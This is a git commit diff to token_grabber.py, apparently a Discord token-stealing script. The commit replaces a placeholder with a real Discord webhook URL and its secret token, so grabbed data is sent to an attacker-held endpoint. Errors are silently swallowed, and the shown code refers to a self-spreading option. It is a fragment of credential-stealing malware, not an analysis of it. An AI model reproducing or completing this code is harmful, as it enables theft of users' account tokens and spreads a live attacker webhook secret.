22e236788c52f62896e35be4da0193f83929dfcb
TwintXx <99735361+TwintXx@users.noreply.github.com>
2022-02-15 13:55:55 +0100

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -181,7 +181,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discordapp.com/api/webhooks/943125380389290074/qWehUGhYjY7x4bj-8XtVA0mHBE3QhCBkojVQbqhHd3mgYaqplf_5vindvzOOemhUqL8-", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
